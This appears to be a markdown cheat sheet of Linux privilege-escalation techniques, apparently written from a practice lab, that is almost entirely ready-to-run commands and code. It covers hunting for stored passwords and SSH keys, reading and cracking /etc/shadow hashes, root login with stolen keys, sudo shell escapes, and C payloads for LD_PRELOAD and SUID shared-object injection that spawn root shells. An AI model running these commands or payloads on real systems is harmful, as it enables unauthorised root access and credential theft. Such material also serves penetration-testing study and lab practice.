# Linux Privesc

- [1. Search Stored Passwords from Config Files](#1-search-stored-passwords-from-config-files)
- [2. Fetching Passwords from /etc/shadow](#2-fetching-passwords-from-etcshadow)
- [3. Escalate Privileges with SSH Key](#3-escalate-privileges-with-ssh-key)
- [4. Shell Escaping via Sudo](#4-shell-escaping-via-sudo)
- [5. Using LD PRELOAD](#5-Using-LD-PRELOAD)
- [6. Privilege Escalation via SUID](#6-Privilege-Escalation-via-SUID)

## 1. Search Stored Passwords from Config Files
### Commands to Find Passwords and SSH Keys
- Search for all config files:
  ```sh
  find / -type f -name "config" 2>/dev/null
  ```
- Search for files containing the word "password":
  ```sh
  find / -type f -exec grep -il "password" {} 2>/dev/null \;
  ```
- Search for config files containing the word "password":
  ```sh
  find / -type f -name "config" -exec grep -il "password" {} 2>/dev/null \;
  ```
- Search for SSH keys:
  ```sh
  find / -name id_rsa 2>/dev/null
  ```
- Search command history for "password":
  ```sh
  history | grep -i "password"
  ```

## 2. Fetching Passwords from /etc/shadow
### Steps to Extract and Crack Password Hashes
1. Extract the `/etc/passwd` file:
   ```sh
   cat /etc/passwd
   ```
   Save output to `passwd.txt`.
2. Extract the `/etc/shadow` file:
   ```sh
   cat /etc/shadow
   ```
   Save output to `shadow.txt`.
3. Combine `passwd.txt` and `shadow.txt` into an unshadowed file:
   ```sh
   unshadow passwd.txt shadow.txt > unshadow.txt
   ```
4. Crack the hashes using Hashcat with the `rockyou.txt` wordlist:
   ```sh
   hashcat -m 1800 unshadow.txt rockyou.txt -O
   ```

## 3. Escalate Privileges with SSH Key
### Steps to Gain Root Access Using SSH Keys
1. Locate `authorized_keys` or `id_rsa` files:
   ```sh
   find / -name authorized_keys 2>/dev/null
   ```
   or
   ```sh
   find / -name id_rsa 2>/dev/null
   ```
2. Save the `id_rsa` file to your machine.
3. Set appropriate permissions for the `id_rsa` file:
   ```sh
   chmod 400 id_rsa
   ```
4. Attempt to access the root shell on the target machine:
   ```sh
   ssh -i id_rsa root@<target-ip>
   ```

## 4. Shell Escaping via Sudo
### Steps to Escalate Privileges Using Sudo
1. Check for sudo permissions:
   ```sh
   sudo -l
   ```
   
![Screenshot From 2025-05-09 22-29-02](https://github.com/user-attachments/assets/0c5884f1-c62c-4203-a7b6-7e503ae49065)<br>

   Output will show commands that can be run as root without a password.
   
1. Exploit passwordless sudo access to gain a root shell using one of the following:

   ```sh
   sudo find /bin -name nano -exec /bin/sh \;
   sudo awk 'BEGIN {system("/bin/sh")}'
   echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
   sudo vim -c '!sh'
   ```
2. Abusing Intended Functionality

   ```sh
   sudo apache2 -f /etc/shadow
   ```
Here, we're telling Apache (with root privileges) to treat /etc/shadow as its configuration file — which is not a valid Apache config, so Apache will try to parse it and fail, which will throw an error message with the hash from /etc/shadow. Now, save the hash in a file hash.txt and we can crack this hash using hashcat or john.
<br>

![Screenshot From 2025-05-09 23-08-43](https://github.com/user-attachments/assets/39d9ca62-ee96-48a8-86cb-fcede471e40e)

## 5. Using LD PRELOAD

1. Type `nano x.c` and paste the code and save:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
2. Now type:
```sh
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so apache2
id
```

## 6. Privilege Escalation via SUID

Make note of all the SUID binaries `suid-env`, `suid-env`, `suid-env2` .

```sh
find / -type f -perm -04000 -ls 2>/dev/null
```

![Screenshot From 2025-05-10 00-49-01](https://github.com/user-attachments/assets/4707d42c-8710-4a46-b854-f7630e3ffcaf)

**SUID Shared Object Injection**

1. Search if there any .so file is missing from a writable directory. `/home/user/.config/libcalc.so`

```sh
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

![Screenshot From 2025-05-10 00-45-04](https://github.com/user-attachments/assets/5741fd84-80c5-4bd3-9651-930316755759)

2. Now create a `libcalc.c` file under the `/home/user/.config/` directory and paste the code:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
3. Compile and run the file:
```sh
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
/usr/local/bin/suid-so
id
```

**SUID Environment Variables**

1. Search if there is any env variables `suid-env`

```sh
strings /usr/local/bin/suid-env
```

---

# short

getcap -r / 2>/dev/null (capabilities)

cat /etc/crontab (cron)

cat /etc/exports (nfs root)
